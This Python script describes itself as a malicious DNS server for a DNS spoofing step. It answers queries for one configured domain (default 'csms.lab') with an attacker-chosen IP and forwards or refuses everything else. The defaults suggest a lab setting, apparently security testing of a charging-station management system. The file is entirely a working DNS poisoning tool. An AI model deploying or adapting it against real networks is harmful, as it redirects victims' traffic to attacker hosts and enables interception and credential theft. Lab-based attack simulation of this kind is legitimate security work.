#!/usr/bin/env python3
"""Malicious DNS server for a DNS spoofing pre-step.

Environment variables:
  LISTEN_HOST     Host to bind the DNS server (default: 0.0.0.0)
  LISTEN_PORT     UDP port to bind (default: 53)
  SPOOF_DOMAIN    Domain to poison (default: csms.lab)
  SPOOF_ADDRESS   IP address to return (default: 172.20.0.10)
  UPSTREAM_DNS    Upstream resolver for non-spoofed queries (default: 8.8.8.8)
  FORWARD_OTHER   If true, forward non-spoofed queries upstream; otherwise REFUSED
"""

import logging
import os
import socket
import sys

from dnslib import A, DNSHeader, DNSRecord, QTYPE, RR

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
)
logger = logging.getLogger("dns_attacker")

LISTEN_HOST = os.getenv("LISTEN_HOST", "0.0.0.0")
LISTEN_PORT = int(os.getenv("LISTEN_PORT", "53"))
SPOOF_DOMAIN = os.getenv("SPOOF_DOMAIN", "csms.lab").rstrip(".").lower()
SPOOF_ADDRESS = os.getenv("SPOOF_ADDRESS", "172.20.0.10")
UPSTREAM_DNS = os.getenv("UPSTREAM_DNS", "8.8.8.8")
FORWARD_OTHER = os.getenv("FORWARD_OTHER", "false").lower() in {"1", "true", "yes", "on"}


def build_refused_response(request: DNSRecord) -> bytes:
    reply = request.reply()
    reply.header.rcode = 5  # REFUSED
    return reply.pack()


def build_spoofed_response(request: DNSRecord) -> bytes:
    reply = request.reply()
    reply.add_answer(RR(
        str(request.q.qname),
        request.q.qtype,
        ttl=60,
        rdata=A(SPOOF_ADDRESS),
    ))
    return reply.pack()


def forward_query(payload: bytes) -> bytes | None:
    if not FORWARD_OTHER:
        return None

    upstream = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    upstream.settimeout(3)
    try:
        upstream.sendto(payload, (UPSTREAM_DNS, 53))
        data, _ = upstream.recvfrom(4096)
        return data
    except socket.timeout:
        logger.warning("Forward timeout for non-spoofed query to upstream %s", UPSTREAM_DNS)
        return None
    except Exception as exc:  # pragma: no cover - runtime/network failure path
        logger.warning("Forwarding error to %s: %s", UPSTREAM_DNS, exc)
        return None
    finally:
        upstream.close()


def is_spoof_target(name: str) -> bool:
    return name.rstrip(".").lower() == SPOOF_DOMAIN


def main() -> None:
    logger.info("Malicious DNS server starting on %s:%s", LISTEN_HOST, LISTEN_PORT)
    logger.info("Spoofing: %s -> %s", SPOOF_DOMAIN, SPOOF_ADDRESS)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LISTEN_HOST, LISTEN_PORT))

    try:
        while True:
            data, client = sock.recvfrom(4096)
            try:
                request = DNSRecord.parse(data)
                question_name = str(request.q.qname).rstrip(".")
                qtype = request.q.qtype
                logger.info("QUERY: %s (%s) from %s", question_name, QTYPE[qtype], client[0])

                if is_spoof_target(question_name):
                    response = build_spoofed_response(request)
                    logger.info("SPOOF: %s -> %s", question_name, SPOOF_ADDRESS)
                    sock.sendto(response, client)
                    continue

                if FORWARD_OTHER:
                    forwarded = forward_query(data)
                    if forwarded is not None:
                        logger.info("FORWARD: %s -> %s", question_name, UPSTREAM_DNS)
                        sock.sendto(forwarded, client)
                        continue

                logger.warning("REFUSED: %s", question_name)
                sock.sendto(build_refused_response(request), client)
            except Exception as exc:  # pragma: no cover - malformed packet path
                logger.error("Failed to process DNS packet from %s: %s", client[0], exc)
                try:
                    sock.sendto(b"", client)
                except Exception:
                    pass
    finally:
        sock.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("DNS attacker stopped by user")
        sys.exit(0)
